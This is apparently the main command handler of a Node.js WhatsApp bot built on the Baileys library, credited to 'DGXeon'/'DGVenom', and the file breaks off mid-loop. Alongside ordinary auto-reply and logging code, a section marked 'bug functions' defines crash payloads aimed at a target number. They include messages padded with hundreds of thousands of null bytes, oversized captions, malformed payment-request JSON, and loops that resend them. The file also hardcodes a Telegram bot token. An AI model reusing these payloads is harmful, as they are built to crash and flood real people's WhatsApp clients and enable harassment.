//base by DGVenom
//re-upload? recode? copy code? give credit ya :)
//YouTube: @vortex-X-no-Name-Tech
//Telegram: https://t.me/+bi_uGsdC46phNTFk
//GitHub: herloverboy
//WhatsApp: https://whatsapp.com/channel/0029Vaylj097z4keWU9KXG0N
//want more free bot scripts? subscribe to my youtube channel: https://www.youtube.com/@vortex-X-no-Name-Tech

const { default: makeWASocket, fetchLatestBaileysVersion, downloadContentFromMessage, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs') 
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const pino = require('pino')
const readline = require("readline");
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const NodeCache = require('node-cache');

//bug database
const { xeontext1 } = require('./80/xeontext1')
const { xeontext2 } = require('./80/xeontext2')
const { xeontext3 } = require('./80/xeontext3')
const { xeontext4 } = require('./80/xeontext4')
const { xeontext5 } = require('./80/xeontext5')
const { xeontext6 } = require('./80/xeontext6')
const { xeontext7 } = require('./80/xeontext7')
const { xeontext8 } = require('./80/xeontext8')
const { xeontext9 } = require('./80/xeontext9')
const { xeontext10 } = require('./80/xeontext10')
const { xeontext11 } = require('./80/xeontext11')
const wkwk = fs.readFileSync(`./80/x.mp3`)
const xsteek = fs.readFileSync(`./80/x.webp`)
const o = fs.readFileSync(`./80/o.jpg`)

//database
let premium = JSON.parse(fs.readFileSync('./database/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./database/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))

//autorep
const VoiceNoteXeon = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'))
const StickerXeon = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'))
const ImageXeon = JSON.parse(fs.readFileSync('./database/autoreply/image.json'))
const VideoXeon = JSON.parse(fs.readFileSync('./database/autoreply/video.json'))
const DocXeon = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'))
const ZipXeon = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
const ApkXeon = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))

//time
const xtime = moment.tz('Asia/Karachi').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Karachi').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Karachi').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var xeonytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 } 
module.exports = GlobalTechInc = async (GlobalTechInc, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreplyglobal.selectedRowId : (m.mtype == 'templateButtonreplyglobalMessage') ? m.message.templateButtonreplyglobalMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreplyglobal.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await GlobalTechInc.decodeJid(GlobalTechInc.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await GlobalTechInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        const clientId = GlobalTechInc.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? GlobalTechInc.user.id.split(':')[0] + "@s.whatsapp.net" || GlobalTechInc.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
        expiredCheck(GlobalTechInc, m, premium);
//group chat msg by xeon
const replyglobal = (teks) => {
GlobalTechInc.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./GlobalMedia/thumb.jpg`),
"sourceUrl": `${link}`}}},
{ quoted: m})
}

async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replyglobal('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const xeonyresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'DGXeon',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            xeonyresult.push(result)
        }
    resolve(xeonyresult)
    })
}

//bug functions
const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./80/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./80/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const oneclickxeon = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `🦄드림 가이 Xeon`
}
}
}
async function blackening(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await GlobalTechInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function locationxeony(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await GlobalTechInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function xeonkillpic(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🦄드림 가이 Xeon",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/1mr4Y16/anjay.jpg" } }, { upload: GlobalTechInc.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #🦄드림 가이 Xeon"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await GlobalTechInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function aipong(target) {
await GlobalTechInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

async function listxeonfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "🦄드림 가이 Xeon"+" ".repeat(920000),
        'footerText': `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`,
        'description': `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: oneclickxeon });
await GlobalTechInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}


const sendReaction = async reactionContent => {
  GlobalTechInc.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

async function sendRepeatedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
   GlobalTechInc.sendMessage(recipientJid, {
      'text': ''.repeat(50000)
    }, {
      'participant': {
        'jid': jid
      },
      'messageId': etc.key.id
    }, {
      'quoted': m
    });
  }
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    GlobalTechInc.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await GlobalTechInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await GlobalTechInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await GlobalTechInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  GlobalTechInc.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}
async function sendPaymentInvite(jid) {
  GlobalTechInc.relayMessage(jid, {
    'paymentInviteMessage': {
      'serviceType': "UPI",
      'expiryTimestamp': Date.now() + 86400000
    }
  }, {
    'participant': {
      'jid': jid
    }
  });
}

async function sendMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await sleep(500);
  }
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendLiveLocationMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return GlobalTechInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return GlobalTechInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: botname
}
}
}

const fakeflow = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
'message': {
"interactiveMessage": {
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": bimg
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${botname}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${ownername}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
}
]
}
}
}
};

const xeonimun = (texto) => {
GlobalTechInc.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return reply("Erro..")
})
}

const subscribe_dgxeon = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `Xeon's ur father`
}}
}
async function XeonyCrashy(dgxeon,chat) {
GlobalTechInc.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${dgxeon}.${xeontext1}` ,
caption: `${dgxeon + xeontext1}`,
}, {quoted: subscribe_dgxeon })
}
//end bug functions

async function loading () {
var xeonlod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
]
let { key } = await GlobalTechInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < xeonlod.length; i++) {
await GlobalTechInc.sendMessage(from, {text: xeonlod[i], edit: key });
}
}

        if (!GlobalTechInc.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        
        if (autoread) {
            GlobalTechInc.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        GlobalTechInc.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        GlobalTechInc.sendPresenceUpdate('recording', from)
        }

        
        //bot number online status, available=online, unavailable=offline
        GlobalTechInc.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
        GlobalTechInc.sendPresenceUpdate(xeonrecordinfinal, from)

        }
        
        if (autobio) {
            GlobalTechInc.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('91') && global.anti91 === true) {
            return GlobalTechInc.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await GlobalTechInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await GlobalTechInc.getName(i)}\nFN:${await GlobalTechInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
	//chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Group Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
        }
        
for (let BhosdikaXeon of VoiceNoteXeon) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./GlobalMedia/audio/${BhosdikaXeon}.mp3`)
GlobalTechInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./GlobalMedia/sticker/${BhosdikaXeon}.webp`)
GlobalTechInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./GlobalMedia/image/${BhosdikaXeon}.jpg`)
GlobalTechInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
